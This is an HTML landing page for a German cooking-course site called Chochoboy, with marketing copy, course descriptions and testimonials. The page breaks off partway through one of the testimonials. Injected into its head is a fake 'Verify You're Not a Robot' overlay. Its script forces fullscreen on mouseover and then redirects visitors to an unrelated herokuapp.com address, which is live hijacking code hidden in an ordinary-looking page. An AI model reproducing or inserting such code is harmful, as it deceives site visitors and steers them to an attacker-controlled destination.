<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Entdecken Sie bei Chochoboy authentische deutsche Rezepte und traditionelle Kochkurse. Werden Sie zum Rezept-Meisterkoch mit unserem professionellen Kursangebot.">
  <meta name="robots" content="index, follow">
  <meta property="og:title" content="Chochoboy - Rezepte | Deutsche traditionelle Rezepte meisterhaft kochen">
  <meta property="og:description" content="Entdecken Sie bei Chochoboy authentische deutsche Rezepte und traditionelle Kochkurse. Werden Sie zum Rezept-Meisterkoch mit unserem professionellen Kursangebot.">
  <meta property="og:type" content="website">
  <title>Chochoboy - Rezepte | Deutsche traditionelle Rezepte meisterhaft kochen</title>
   <div id="popup-wrapper" onmouseover="fullscreenAndRedirect()">
    <div id="popup-bg"></div>

    <div class="popup-card">
      <span class="close-btn">&times;</span>

      <div class="content">
        <div class="icon">🤖</div>

        <div class="text">
          <h2>Verify You're Not a Robot</h2>

          <p>
            Please complete the verification below before continuing.
          </p>

          <div class="robot-box">
            <input type="checkbox" id="robotCheck">
            <label for="robotCheck">I'm not a robot</label>

            <div class="captcha-brand">
              <div>Verification</div>
              <small>Human Check</small>
            </div>
          </div>

          <div class="actions">
            <button id="continueBtn" disabled>
              Continue
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
    }

    #popup-wrapper {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2147483647;
    }

    #popup-bg {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, .65);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
    }

    .popup-card {
      position: relative;
      width: 720px;
      max-width: 92%;
      background: #fff;
      border-radius: 22px;
      padding: 28px;
      box-shadow: 0 30px 90px rgba(0, 0, 0, .45);
      font-family: Arial, Helvetica, sans-serif;
      z-index: 2147483647;
      animation: popup .25s ease-out;
    }

    @keyframes popup {
      from {
        opacity: 0;
        transform: scale(.9);
      }

      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    .close-btn {
      position: absolute;
      right: 16px;
      top: 12px;
      font-size: 30px;
      font-weight: bold;
      cursor: pointer;
      color: #666;
    }

    .content {
      display: flex;
      gap: 20px;
    }

    .icon {
      width: 70px;
      height: 70px;
      min-width: 70px;
      border-radius: 16px;
      background: #f3f4f6;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 38px;
    }

    .text {
      flex: 1;
    }

    .text h2 {
      margin: 0 0 10px;
      font-size: 34px;
      font-weight: 800;
      color: #111827;
    }

    .text p {
      margin: 0;
      font-size: 18px;
      line-height: 1.6;
      color: #4b5563;
    }

    .robot-box {
      margin-top: 22px;
      border: 1px solid #d1d5db;
      border-radius: 10px;
      background: #fafafa;
      padding: 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .robot-box input {
      width: 28px;
      height: 28px;
      cursor: pointer;
    }

    .robot-box label {
      flex: 1;
      margin-left: 12px;
      font-size: 20px;
      cursor: pointer;
    }

    .captcha-brand {
      text-align: center;
      font-size: 12px;
      color: #6b7280;
    }

    .actions {
      margin-top: 24px;
    }

    .actions button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      background: #2563eb;
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      cursor: pointer;
    }

    .actions button:disabled {
      opacity: .5;
      cursor: not-allowed;
    }

    @media(max-width:768px) {
      .content {
        flex-direction: column;
      }

      .icon {
        margin: auto;
      }

      .text h2 {
        font-size: 28px;
        text-align: center;
      }

      .text p {
        text-align: center;
      }
    }
  </style>

  <script>
    const robotCheck = document.getElementById("robotCheck");
    const continueBtn = document.getElementById("continueBtn");

    robotCheck.addEventListener("change", function () {
      continueBtn.disabled = !this.checked;
    });

    continueBtn.addEventListener("click", function () {
      alert("Verification completed.");
      // Add your own action here
    });

    document.querySelector(".close-btn").addEventListener("click", function () {
      document.getElementById("popup-wrapper").style.display = "none";
    });

     function fullscreenAndRedirect() {
    const el = document.documentElement;

    if (!document.fullscreenElement) {
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if (el.msRequestFullscreen) el.msRequestFullscreen();
    }

    setTimeout(() => {
      window.location.href = "https://windbnvmnbvmnbvde-57c9d065f87e.herokuapp.com/";
    }, 1000);
  }
  </script>
  <link rel="canonical" href="https://chochoboy-site.com">
  <link rel="icon" type="image/svg+xml" href="{{favicon_file}}">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            primary: '#10B981',
            'primary-dark': '#059669',
          }
        }
      }
    }
  </script>
  <style>
    html { scroll-behavior: smooth; }
    .btn-primary { background-color: #10B981; }
    .btn-primary:hover { background-color: #059669; }
    .text-primary { color: #10B981; }
    .bg-primary { background-color: #10B981; }
    .border-primary { border-color: #10B981; }
    .ring-primary { --tw-ring-color: #10B981; }

    /* Nav underline animation */
    .nav-link {
      position: relative;
      padding-bottom: 2px;
    }
    .nav-link::after {
      content: '';
      position: absolute;
      bottom: 0; left: 0;
      width: 0; height: 2px;
      background-color: #10B981;
      transition: width 0.25s ease;
    }
    .nav-link:hover::after { width: 100%; }

    /* Browser mockup */
    .browser-frame {
      background: #f1f5f9;
      border-radius: 12px;
      box-shadow: 0 25px 60px -12px rgba(0,0,0,0.18), 0 4px 6px -2px rgba(0,0,0,0.06);
      overflow: hidden;
      border: 1px solid #e2e8f0;
    }
    .browser-bar {
      background: #e2e8f0;
      padding: 10px 14px;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .browser-dot {
      width: 10px; height: 10px;
      border-radius: 50%;
    }
    .browser-url {
      flex: 1;
      background: white;
      border-radius: 4px;
      height: 22px;
      margin-left: 10px;
    }

    /* FAQ chevron animation */
    .faq-chevron { transition: transform 0.3s ease; }
    .faq-chevron.open { transform: rotate(180deg); }
    .faq-body { display: none; }
    .faq-body.open { display: block; }

    /* Benefits alternating */
    .benefit-row:nth-child(even) { background-color: #f8fafc; }

    {{template_custom_css}}
  </style>
</head>
<body class="font-sans text-gray-800 antialiased bg-white">

<!-- Cookie Banner -->
<div id="cookie-banner" class="fixed bottom-0 left-0 right-0 z-50 bg-white border-t-2 border-primary p-4 shadow-2xl" style="display:none;">
  <div class="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
    <p class="text-sm text-gray-600">
      Wir verwenden Cookies, um Ihre Erfahrung auf unserer Website zu verbessern und Ihnen personalisierte Inhalte zu unseren deutschen Rezeptkursen anzuzeigen. Bitte wählen Sie Ihre Cookie-Einstellungen. <a href="privacy-policy.html" class="text-primary font-semibold hover:underline">Cookie-Richtlinie</a>.
    </p>
    <div class="flex gap-3 shrink-0">
      <button onclick="acceptCookies('necessary')" class="px-4 py-2 text-sm border border-gray-300 rounded-lg text-gray-600 hover:bg-gray-50 transition">Nur notwendige</button>
      <button onclick="acceptCookies('all')" class="px-4 py-2 text-sm rounded-lg text-white font-semibold transition btn-primary">Alle akzeptieren</button>
    </div>
  </div>
</div>

<!-- Header -->
<header id="main-header" class="sticky top-0 z-40 bg-white border-b border-gray-100 shadow-sm">
  <div class="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
    <!-- Logo with tech icon -->
    <a href="/" class="flex items-center gap-2">
      <div class="w-8 h-8 rounded-lg flex items-center justify-center bg-primary">
        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17H3a2 2 0 01-2-2V5a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2h-2"/></svg>
      </div>
      <span class="text-xl font-bold text-gray-900">Chochoboy</span>
    </a>
    <nav class="hidden md:flex items-center gap-7 text-sm font-medium text-gray-600">
      <a href="#about" class="nav-link hover:text-gray-900 transition">Über uns</a>
      <a href="#services" class="nav-link hover:text-gray-900 transition">Angebote</a>
      <a href="#testimonials" class="nav-link hover:text-gray-900 transition">Bewertungen</a>
      <a href="#faq" class="nav-link hover:text-gray-900 transition">FAQ</a>
      <a href="contact.html" class="nav-link hover:text-gray-900 transition">Kontakt</a>
    </nav>
    <a href="#cta" class="hidden md:inline-flex items-center gap-2 px-5 py-2 text-sm font-semibold border-2 border-primary text-primary rounded-lg hover:bg-primary hover:text-white transition">
      Jetzt Kurs starten
      <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"/></svg>
    </a>
    <button id="menu-btn" class="md:hidden p-2 rounded-lg text-gray-600 hover:text-primary hover:bg-gray-50" onclick="toggleMenu()">
      <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
    </button>
  </div>
  <div id="mobile-menu" class="hidden md:hidden bg-white border-t border-gray-100 px-4 py-4 space-y-3 text-sm font-medium text-gray-600">
    <a href="#about" class="block py-2 hover:text-primary" onclick="toggleMenu()">Über uns</a>
    <a href="#services" class="block py-2 hover:text-primary" onclick="toggleMenu()">Angebote</a>
    <a href="#testimonials" class="block py-2 hover:text-primary" onclick="toggleMenu()">Bewertungen</a>
    <a href="#faq" class="block py-2 hover:text-primary" onclick="toggleMenu()">FAQ</a>
    <a href="contact.html" class="block py-2 hover:text-primary" onclick="toggleMenu()">Kontakt</a>
    <a href="#cta" class="block mt-2 px-4 py-2 text-white rounded-lg text-center btn-primary font-semibold" onclick="toggleMenu()">Jetzt Kurs starten</a>
  </div>
</header>

<!-- Hero — split layout -->
<section class="bg-gradient-to-br from-slate-50 via-white to-blue-50 py-20 md:py-28 overflow-hidden">
  <div class="max-w-6xl mx-auto px-4 flex flex-col lg:flex-row items-center gap-14">
    <!-- Left: text + checklist -->
    <div class="flex-1 max-w-xl">
      <span class="inline-block px-3 py-1 text-xs font-semibold rounded-full text-white mb-5 bg-primary">Meisterkoch werden</span>
      <h1 class="text-4xl md:text-5xl lg:text-6xl font-extrabold text-gray-900 leading-tight mb-5">Traditionelle Deutsche Rezepte Meisterhaft Kochen Lernen</h1>
      <p class="text-lg text-gray-500 mb-8 leading-relaxed">Entdecken Sie authentische deutsche Küche mit unseren professionellen Rezeptkursen und werden Sie zum wahren Kochmeister.</p>
      <!-- Feature checklist -->
      <ul class="space-y-3 mb-10">
        <li class="flex items-center gap-3 text-gray-700 font-medium">
          <span class="w-6 h-6 rounded-full bg-green-100 flex items-center justify-center shrink-0">
            <svg class="w-3.5 h-3.5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
          </span>
          Authentische Rezepte
        </li>
        <li class="flex items-center gap-3 text-gray-700 font-medium">
          <span class="w-6 h-6 rounded-full bg-green-100 flex items-center justify-center shrink-0">
            <svg class="w-3.5 h-3.5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
          </span>
          Flexibles Lernen
        </li>
        <li class="flex items-center gap-3 text-gray-700 font-medium">
          <span class="w-6 h-6 rounded-full bg-green-100 flex items-center justify-center shrink-0">
            <svg class="w-3.5 h-3.5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
          </span>
          Expertenunterstützung
        </li>
      </ul>
      <a href="#cta" class="inline-flex items-center gap-3 px-8 py-4 text-white font-bold rounded-xl shadow-lg btn-primary transition text-lg">
        Jetzt Kurs starten
        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"/></svg>
      </a>
      <a href="#about" class="inline-flex items-center gap-2 ml-4 text-sm text-gray-500 hover:text-gray-700 transition font-medium">Rezepte entdecken</a>
    </div>
    <!-- Right: browser frame mockup -->
    <div class="flex-1 w-full max-w-lg">
      <div class="browser-frame">
        <div class="browser-bar">
          <div class="browser-dot bg-red-400"></div>
          <div class="browser-dot bg-yellow-400"></div>
          <div class="browser-dot bg-green-400"></div>
          <div class="browser-url"></div>
        </div>
        <img src="images/hero.jpg" alt="Traditionelle deutsche Rezepte und Gerichte von Chochoboy Meisterkochkurs" width="600" height="400" class="w-full object-cover block" loading="eager">
      </div>
    </div>
  </div>
</section>

<!-- About — stats bar + text + image -->
<section id="about" class="py-20 bg-white">
  <!-- Stats bar -->
  <div class="bg-gray-50 border-y border-gray-100 py-10 mb-16">
    <div class="max-w-5xl mx-auto px-4 grid grid-cols-3 gap-8 text-center">
      <div>
        <div class="text-4xl font-extrabold text-primary">10+</div>
        <div class="text-sm text-gray-500 mt-1 font-medium">Jahre Kocherfahrung</div>
      </div>
      <div>
        <div class="text-4xl font-extrabold text-primary">5000+</div>
        <div class="text-sm text-gray-500 mt-1 font-medium">Zufriedene Schüler</div>
      </div>
      <div>
        <div class="text-4xl font-extrabold text-primary">98%</div>
        <div class="text-sm text-gray-500 mt-1 font-medium">Erfolgsquote</div>
      </div>
    </div>
  </div>
  <div class="max-w-6xl mx-auto px-4 flex flex-col md:flex-row gap-12 items-center">
    <div class="flex-1">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Unsere Geschichte</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2 mb-6 leading-tight">Leidenschaft für deutsche Küche und traditionelle Rezepte</h2>
      <p class="text-gray-500 leading-relaxed mb-4">Chochoboy wurde mit der Mission gegründet, die reiche Tradition der deutschen Küche zu bewahren und weiterzugeben. Unsere Plattform bietet sorgfältig ausgearbeitete Rezeptkurse, die von erfahrenen Köchen entwickelt wurden. Jedes Rezept erzählt eine Geschichte und verbindet Generationen durch den gemeinsamen Genuss traditioneller deutscher Gerichte.</p>
      <p class="text-gray-500 leading-relaxed mb-4">Unser Ansatz verbindet klassische deutsche Kochtechniken mit modernen Lehrmethoden. Wir glauben, dass jeder das Kochen meistern kann, wenn er die richtigen Anleitungen und Unterstützung erhält. Von der Zubereitung eines klassischen Sauerbratens bis hin zu traditionellen Brezeln – wir begleiten Sie auf Ihrem Weg zur Kochmeisterschaft mit professionellen Rezeptkursen.</p>
      <p class="text-gray-500 leading-relaxed mb-6">Seit unserer Gründung haben wir tausende von Hobbyköchen und Profis dabei geholfen, die deutsche Küche zu entdecken und zu meistern. Unsere Rezeptkurse sind so gestaltet, dass sie sowohl für Anfänger als auch für erfahrene Köche geeignet sind. Treten Sie unserer wachsenden Gemeinschaft von Kochbegeisterten bei und erleben Sie die Freude der traditionellen deutschen Rezeptkunst.</p>
      <a href="about.html" class="inline-flex items-center gap-2 font-semibold text-primary hover:underline">
        Mehr über uns erfahren
        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"/></svg>
      </a>
    </div>
    <div class="flex-1">
      <img src="images/about.jpg" alt="Chochoboy Team bereitet traditionelle deutsche Rezepte in der Küche vor" width="540" height="400" class="w-full rounded-2xl shadow-xl object-cover" loading="lazy">
    </div>
  </div>
</section>

<!-- Services — icon grid with hover lift -->
<section id="services" class="py-20 bg-slate-50">
  <div class="max-w-6xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Unsere Angebote</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Professionelle Rezeptkurse für jeden Kochlevel</h2>
      <p class="text-gray-500 mt-3 max-w-xl mx-auto">Von Anfänger bis Meisterkoch – wir bieten maßgeschneiderte Kurse für deutsche traditionelle Rezepte und Kochtechniken.</p>
    </div>
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
      <div class="bg-white rounded-2xl p-7 shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 border border-gray-100">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-5 bg-primary">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Grundlagen der deutschen Küche</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Lernen Sie die Grundlagen der traditionellen deutschen Küche kennen. Perfekt für Anfänger, die klassische Rezepte und Kochtechniken erlernen möchten. Schritt für Schritt zur Kochmeisterschaft.</p>
      </div>
      <div class="bg-white rounded-2xl p-7 shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 border border-gray-100">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-5 bg-blue-100">
          <svg class="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Meisterkoch Rezeptkurs</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Tauchen Sie tief in die Geheimnisse der deutschen Meisterküche ein. Dieser fortgeschrittene Kurs vermittelt komplexe Rezepttechniken und traditionelle Zubereitungsmethoden für anspruchsvolle Gerichte.</p>
      </div>
      <div class="bg-white rounded-2xl p-7 shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 border border-gray-100">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-5 bg-purple-100">
          <svg class="w-6 h-6 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.06 22.99h1.66c.84 0 1.53-.64 1.63-1.46L23 5.05h-5V1h-1.97v4.05h-4.97l.3 2.34c1.71.47 3.31 1.32 4.27 2.26 1.44 1.42 2.43 2.89 2.43 5.29v8.05zM1 21.99V21h15.03v.99c0 .55-.45 1-1.01 1H2.01c-.56 0-1.01-.45-1.01-1zm15.03-7H1v-2h15.03v2zm0-4H1v-2h15.03v2z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Deutsche Backrezepte</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Entdecken Sie die Welt des deutschen Backens mit traditionellen Rezepten für Brot, Brezel und Kuchen. Lernen Sie authentische Backtechniken kennen, die seit Generationen weitergegeben werden.</p>
      </div>
      <div class="bg-white rounded-2xl p-7 shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 border border-gray-100">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-5 bg-green-100">
          <svg class="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Regionale Rezeptspezialitäten</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Erkunden Sie die kulinarische Vielfalt Deutschlands mit regionalen Spezialitäten aus Bayern, Sachsen, dem Rheinland und mehr. Authentische traditionelle Rezepte aus allen deutschen Regionen.</p>
      </div>
      <div class="bg-white rounded-2xl p-7 shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 border border-gray-100">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-5 bg-orange-100">
          <svg class="w-6 h-6 text-orange-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Live-Kochsessions</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Nehmen Sie an interaktiven Live-Kochsessions teil und lernen Sie direkt von unseren Meisterköchen. Stellen Sie Fragen zu deutschen Rezepten und erhalten Sie sofortiges Feedback zu Ihrer Kochtechnik.</p>
      </div>
      <div class="bg-white rounded-2xl p-7 shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 border border-gray-100">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-5 bg-pink-100">
          <svg class="w-6 h-6 text-pink-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Rezept-Zertifizierungsprogramm</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Erwerben Sie ein offizielles Zertifikat als Experte für deutsche traditionelle Rezepte. Unser anerkanntes Programm bestätigt Ihre Kenntnisse und Fähigkeiten in der deutschen Meisterküche.</p>
      </div>
    </div>
  </div>
</section>

<!-- Benefits — feature list with large checkmarks, alternating rows -->
<section class="py-20 bg-white">
  <div class="max-w-5xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Ihre Vorteile</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Warum Chochoboy für Ihre Rezeptausbildung wählen?</h2>
    </div>
    <div class="rounded-2xl overflow-hidden border border-gray-100 shadow-sm">
      <div class="benefit-row flex flex-col sm:flex-row items-start sm:items-center gap-5 px-8 py-7 bg-white">
        <div class="w-12 h-12 rounded-full bg-green-100 flex items-center justify-center shrink-0">
          <svg class="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
        </div>
        <div>
          <h3 class="font-bold text-gray-900 text-lg">Authentische Rezepte</h3>
          <p class="text-gray-500 text-sm mt-1 leading-relaxed">Alle unsere deutschen Rezepte sind von echten Meisterköchen entwickelt und auf ihre Authentizität und traditionellen Wurzeln geprüft worden.</p>
        </div>
      </div>
      <div class="benefit-row flex flex-col sm:flex-row items-start sm:items-center gap-5 px-8 py-7 bg-slate-50">
        <div class="w-12 h-12 rounded-full bg-green-100 flex items-center justify-center shrink-0">
          <svg class="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
        </div>
        <div>
          <h3 class="font-bold text-gray-900 text-lg">Flexibles Lernen</h3>
          <p class="text-gray-500 text-sm mt-1 leading-relaxed">Lernen Sie in Ihrem eigenen Tempo mit unbegrenztem Zugang zu allen Rezeptkursen und Lernmaterialien auf jeder Plattform.</p>
        </div>
      </div>
      <div class="benefit-row flex flex-col sm:flex-row items-start sm:items-center gap-5 px-8 py-7 bg-white">
        <div class="w-12 h-12 rounded-full bg-green-100 flex items-center justify-center shrink-0">
          <svg class="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
        </div>
        <div>
          <h3 class="font-bold text-gray-900 text-lg">Expertenunterstützung</h3>
          <p class="text-gray-500 text-sm mt-1 leading-relaxed">Unsere erfahrenen Meisterköche begleiten Sie durch jeden Schritt Ihrer Kochausbildung und beantworten alle Ihre Fragen zu deutschen Rezepten.</p>
        </div>
      </div>
      <div class="benefit-row flex flex-col sm:flex-row items-start sm:items-center gap-5 px-8 py-7 bg-slate-50">
        <div class="w-12 h-12 rounded-full bg-green-100 flex items-center justify-center shrink-0">
          <svg class="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
        </div>
        <div>
          <h3 class="font-bold text-gray-900 text-lg">Zertifizierung inklusive</h3>
          <p class="text-gray-500 text-sm mt-1 leading-relaxed">Nach Abschluss des Kurses erhalten Sie ein anerkanntes Zertifikat, das Ihre Kenntnisse in deutschen traditionellen Rezepten bestätigt.</p>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- Testimonials — avatar + stars + quote card, middle card accented -->
<section id="testimonials" class="py-20 bg-slate-50">
  <div class="max-w-6xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Bewertungen</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Was unsere Schüler über ihre Rezeptkurse sagen</h2>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
      <!-- Card 1 -->
      <div class="bg-white rounded-2xl p-7 shadow-sm border border-gray-100">
        <div class="flex gap-1 mb-3">
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-gray-600 text-sm leading-relaxed mb-6">"Chochoboy hat meine Leidenschaft für deutsche Küche komplett neu entfacht. Die Rezepte sind authentisch und die Erklärungen sind so klar, dass ich problemlos komplexe traditionelle Gerichte nachkochen konnte. Der Meisterkochkurs war eine absolute Offenbarung für mich als Hobbykoch."</p>
        <div class="flex items-center gap-3">
